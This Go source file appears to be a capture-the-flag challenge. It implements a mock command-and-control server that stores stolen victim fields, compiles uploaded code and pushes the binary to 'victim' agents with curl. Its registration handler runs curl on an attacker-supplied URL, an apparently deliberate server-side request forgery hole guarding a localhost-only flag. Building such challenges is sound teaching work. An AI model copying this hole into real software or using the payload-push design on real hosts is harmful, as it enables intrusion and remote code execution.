package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"sync"
	"time"

	"ctf.nusgreyhats.org/c2/secrets"
	"github.com/google/uuid"
)

var agents = map[string]*agent{}
var agentLock = sync.RWMutex{}

type agent struct {
	AgentUrl       string `json:"agentUrl"`
	ComputerName   string `json:"computerName"`
	IpAddress      string `json:"ipAddress"`
	CryptoKey      string `json:"cryptoKey"`
	MasterPassword string `json:"masterPassword"`
	SSN            string `json:"ssn"`
	CreditCard     string `json:"creditCard"`
}

func executeCommandWithTimeout(name string, args ...string) error {
	ctx, cancel := context.WithTimeout(context.Background(), time.Second*10)
	defer cancel()

	cmd := exec.CommandContext(ctx, name, args...)
	cmd.Dir = os.TempDir()
	return cmd.Run()
}

func handleRegistration(w http.ResponseWriter, req *http.Request) {
	var reg agent
	body := http.MaxBytesReader(w, req.Body, 0x1000)
	err := json.NewDecoder(body).Decode(&reg)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprintln(w, "Invalid JSON")
		return
	}

	log.Printf("%v: %v\n", req.RemoteAddr, reg.AgentUrl)

	err = executeCommandWithTimeout("curl", reg.AgentUrl)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprintln(w, "Failed to connect with C2 agent")
		return
	}

	agentId := uuid.NewString()
	agentLock.Lock()
	defer agentLock.Unlock()
	agents[agentId] = &reg

	fmt.Fprint(w, agentId)
}

func handleRequestAgentData(w http.ResponseWriter, r *http.Request) {
	agentLock.RLock()
	defer agentLock.RUnlock()
	agentId := r.PathValue("id")
	agent, ok := agents[agentId]
	if !ok {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprintln(w, "C2 Agent not found!")
		return
	}
	json.NewEncoder(w).Encode(agent)
}

func handleExec(w http.ResponseWriter, r *http.Request) {
	agentLock.RLock()
	defer agentLock.RUnlock()
	agentId := r.PathValue("id")
	agent, ok := agents[agentId]
	if !ok {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprintln(w, "C2 Agent not found!")
		return
	}

	body := http.MaxBytesReader(w, r.Body, 0x1000)
	defer body.Close()
	dir, err := os.MkdirTemp("", "c2_")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprintln(w, "Failed to create temp dir!")
		return
	}
	defer os.RemoveAll(dir)
	fname := fmt.Sprintf("%s/main.go", dir)
	binName := fmt.Sprintf("%s/main", dir)
	f, err := os.Create(fname)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprintln(w, "Failed to create payload temp file!")
		return
	}
	defer f.Close()
	f.ReadFrom(body)

	err = executeCommandWithTimeout("go", "build", "-ldflags", "-s -w", "-o", binName, fname)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprintln(w, "Failed to compile payload!")
		return
	}
	agentExecUrl := fmt.Sprintf("%s/exec", agent.AgentUrl)
	err = executeCommandWithTimeout("curl", "-T", binName, agentExecUrl)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprintln(w, "Failed to send payload to victim!")
		return
	}
	fmt.Fprintln(w, "Payload sent to victim!")
}

// Admin only
// Prints flag (you'll never get it)
func handleFlag(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, secrets.Flag)
}

func isLocalhost(req *http.Request) bool {
	if req == nil {
		return false
	}
	host, _, err := net.SplitHostPort(req.RemoteAddr)
	if err != nil {
		return false
	}

	return host == "127.0.0.1" || host == "::1" || host == "[::1]"
}

func adminOnly(next http.HandlerFunc) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !isLocalhost(r) {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprintln(w, "Only admins can access this page!")
			return
		}
		next(w, r)
	})
}

func main() {
	http.HandleFunc("POST /register", handleRegistration)
	http.Handle("GET /agent/{id}", adminOnly(handleRequestAgentData))
	http.Handle("POST /agent/{id}/execute", adminOnly(handleExec))
	http.Handle("GET /flag", adminOnly(handleFlag))

	http.ListenAndServe(":8080", nil)
}
